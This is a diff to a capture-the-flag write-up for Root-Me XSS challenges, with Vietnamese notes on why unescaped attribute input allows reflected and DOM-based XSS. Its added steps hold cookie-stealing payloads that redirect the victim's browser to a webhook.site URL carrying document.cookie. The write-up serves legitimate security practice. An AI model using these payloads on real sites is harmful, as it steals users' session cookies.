@@ -45,23 +45,57 @@
 
 ### Steps to reproduce
 
-    - Create a free request capturer @ https://pipedream.com
-    - Start event listening at the request capturer
-    - Visit http://challenge01.root-me.org/web-client/ch26/?p=exp' onmouseover='document.write(%22<img src=request_capturer_url?%22.concat(document.cookie).concat(%22 />%22))
+    - Visit http://challenge01.root-me.org/web-client/ch26/?p=exp' onmousemove='document.location="https://webhook.site/c8a95cae-3c65-4ff0-8d90-e388c8148607?cmd=".concat(document.cookie)
     - Exp' is the reflected xss, we want the document cookie, we encode the paylod
     - Click on Report to the administrator
-    - Wait for the bot to load the image and thus the cookie stealer
-    - Copy the flag in the captured request cookie
+    - Đợi cho bot tải hình ảnh và do đó là kẻ đánh cắp cookie
+    - Sao chép cờ trong cookie
+
+Nếu user truy cập:
+```
+http://example.com/?p=about
+```
+→ Server trả về:
+```
+<a href='?p=about'>Link</a>
+```
+✅ Bình thường.  
+Nhưng attacker gửi:
+```
+http://example.com/?p=about' onmouseover='alert(1)
+```
+→ Server trả về:
+```
+<a href='?p=about' onmouseover='alert(1)'>Link</a>
+```
+➡️ Lúc này, HTML bị chèn thêm attribute `onmouseover="alert(1)"`.  
+Nếu người dùng di chuột vào link → JavaScript chạy → Reflected XSS.  
+Nguyên nhân chính:
+
+Input được phản chiếu trực tiếp ra HTML.
+
+Không escape đặc biệt (', ", <, >) trước khi in ra.
+
+Browser hiểu nội dung đó như một phần HTML/JavaScript, không phải plain text.  
+`document.location="..."` Dùng để thay đổi URL hiện tại của trình duyệt → tự động điều hướng (redirect).  
+`"https://webhook.site/... ?cmd=".concat(document.cookie)`  
+`"https://webhook.site/... ?cmd="` → là chuỗi cố định.
+
+`document.cookie` → chứa cookie của người dùng.
+
+`.concat(document.cookie)` → nối cookie vào chuỗi trên.
+
+`.concat()` là hàm của String dùng để nối chuỗi.
 
 ## [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
 
 ### Steps to reproduce
 
-    - Create a free request capturer @ https://pipedream.com
-    - Start event listening at the request capturer
+    - Chall này có một thanh input và nó như một trò chơi nho nhỏ đoán số được sinh ra ngẫu nhiên và ghi lại input vào đoạn mã script
     - Visit http://challenge01.root-me.org/web-client/ch32/contact.php
-    - As a payload insert http://challenge01.root-me.org/web-client/ch32/index.php?number=%27%3Bdocument.location.href%3D%27https%3A%2F%2F6b6fea4abe6e6a0876505f85b3377c72.m.pipedream.net%2F%3Fitworks%3D%27.concat%28document.cookie%29%3B%2F%2F
-    - The url uses document.location to directly redirect, the url is url encoded, the payload breaks out of the client script by suffix '; and prefix // respectively
+    - test: http://challenge01.root-me.org/web-client/ch32/index.php?number=1'; alert(1);
+    - client script by suffix '; and prefix // respectively 1';alert(1);//';
+    - As a payload insert: http://challenge01.root-me.org/web-client/ch32/index.php?number=1';document.location="https://webhook.site/c8a95cae-3c65-4ff0-8d90-e388c8148607?cmd=".concat(document.cookie);//
     - Click on Submit
     - Wait for the bot to click on the link
     - Copy the flag in the captured request cookie
@@ -333,9 +367,3 @@ public SocketNode(Socket socket2, LoggerRepository hierarchy2) {
 
 * [Deprecate SerializedLayout and remove it as default.](https://git-wip-us.apache.org/repos/asf?p=logging-log4j2.git;h=7067734)
 * [Add class filtering to AbstractSocketServer](https://git-wip-us.apache.org/repos/asf?p=logging-log4j2.git;h=5dcc192)
-
-# Contributors
-
-[![Alexander Brese](https://avatars.githubusercontent.com/u/24847484?s=50&v=4)](https://github.com/AlexanderBrese)
-
-[![Melanie Galip](https://avatars.githubusercontent.com/u/89995014?s=50&v=4)](https://github.com/mela-glp)
